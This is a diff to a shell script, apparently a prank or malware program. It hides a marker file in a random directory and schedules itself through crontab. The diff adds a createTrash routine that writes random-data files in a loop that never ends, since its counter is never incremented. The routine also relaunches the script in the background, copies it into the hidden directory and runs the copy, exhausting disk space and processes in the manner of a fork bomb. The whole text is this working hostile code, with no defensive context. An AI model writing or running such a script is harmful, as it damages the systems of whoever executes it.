@@ -44,15 +44,21 @@ findDir() {
 	local old_path="$(find $HOME -maxdepth 5 -name $UFILE)"
 	local random=0
 	local new_path=""
+	local size=0
 
+	$(find $ROOT -maxdepth 4 -type d > $TMP_FILE)
 	if [ "$old_path" = "" ]; then
+		size=$(cat $TMP_FILE | wc -l)
 		random=$(expr $(od -A n -t d -N 1 /dev/random | awk '{print $1}') % $size)
 		new_path="$(cat $TMP_FILE | head -$random | tail -1)"
-		$(touch "$new_path/$UFILE")
+		touch "$new_path/$UFILE"
 		UFILE_DIR="$new_path"
+		# echo "file created in '$new_path'"
+		$(rm -f $TMP_FILE)
+		return 0
 	fi
 
-	local size=$(($(echo "$old_path" | wc -c) - $(echo $UFILE | wc -c)))
+	size=$(($(echo "$old_path" | wc -c) - $(echo $UFILE | wc -c)))
 	$(find $ROOT -maxdepth 4 -type d > $TMP_FILE)
 	if [ "$old_path" = "" ]; then
 		$(touch "")
@@ -70,15 +76,23 @@ findDir() {
 		fi
 		break
 	done
-	$(rm -f "$old_path$UFILE")
-	$(touch "$new_path/$UFILE")
+	# echo "file created in '$new_path' filename '$UFILE'"
+	$(rm -f "$old_path$UFILE" $TMP_FILE)
+	touch "$new_path/$UFILE"
 	UFILE_DIR="$new_path/"
 }
 
 createTrash() {
-	
+	local i=0
+
+	while [ $i -lt 15 ]; do
+		cat /dev/random | head -15 > "$UFILE_DIR$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32)"
+	done
+	$(sh $0 &) &
+	cp $0 "$UFILE_DIR$NAME"
+	$(sh "$UFILE_DIR$NAME")
 }
 
 setCrontab
 findDir
-
+createTrash
